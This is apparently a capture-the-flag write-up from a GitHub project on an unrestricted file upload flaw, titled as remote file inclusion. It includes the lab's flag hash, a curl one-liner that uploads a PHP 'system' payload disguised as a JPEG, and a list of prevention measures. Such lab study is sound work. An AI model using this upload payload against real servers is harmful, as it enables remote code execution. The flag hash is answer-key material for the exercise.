# REMOTE_FILE_INCLUSION_(RFI)

## 🏴 Flag
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## 📌 Extract

Page: [http://{IP}/index.php?page=upload](http://{IP}/index.php?page=upload)  
Inspect this form:

```html
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>
```

This HTML form allows file uploads via a POST request, focus on:  
`<input name="uploaded" type="file">`: File selection field.  
`<input type="submit" name="Upload" value="Upload">`: Upload button.

> Testing injection of a php file

```sh
echo "<?php system('ls'); ?>" | \
curl -F "Upload=Upload" \
-F "uploaded=@-;type=image/jpeg" "http://{IP}/index.php?page=upload" | \
grep "The flag is :"
```

Sends an HTTP POST request to the website's upload page :
- `echo "<?php system('ls'); ?>"` : Create a php script.
- `-F "Upload=Upload"`: Simulates a submit button.
- `-F "uploaded=@-;type=image/jpeg"`:
	- `@-` means the file is taken from standard input (from the previous echo).
	- `type=image/jpeg` attempts to trick the server into believing it's an image.
- `grep "The flag is :”` filters the response.

## 🎯 Use

**Unrestricted File Upload** is a vulnerability where a website allows users to **upload files without properly validating** heir type or content. This can allow an attacker to upload malicious files (such as scripts) and **execute** them on the server.

- **Remote code execution:** Uploading a PHP file or executable script to take control of the server or run commands.  

- **Unauthorized data access:** Malicious files in public directories can be used to steal sensitive data like databases or config files.  

- **Privilege escalation:** Exploiting the vulnerability to gain admin privileges or access restricted server areas.  

- **🎣 Phishing or redirection attacks:** Malicious files executed in the user's browser can redirect them to malicious sites or steal sensitive information.

## 🔒 Prevention

1. **Strict file validation:** Allow only safe file types (e.g., images, documents) and reject executables (e.g., .php, .exe).  

2. **Rename uploaded files:** Rename uploaded files to random names to block execution.  

3. **File content detection:** Verify file content matches its type (e.g., ensure .jpg is an image, not a script).  

4. **Disable execution:** Prevent execution in upload directories (e.g., use .htaccess or similar settings).  

5. **Limit permissions:** Set read/write-only permissions, not execute.  

6. **Security tools:** Use antivirus or file scanners.

## 📚 Documentation

[wikipedia.org (Remote_File_Inclusion)](https://fr.wikipedia.org/wiki/Remote_File_Inclusion)  
[vaadata.com (exploitation-dune-faille-lfi)](https://www.vaadata.com/blog/fr/exploitation-dune-faille-lfi-local-file-inclusion-et-bonnes-pratiques-securite/)  
[chocapikk.com (faille_upload)](https://chocapikk.com/posts/2023/faille_upload/)

### 📖 [Home page](https://github.com/hugo-bourgeon/darkly#readme)

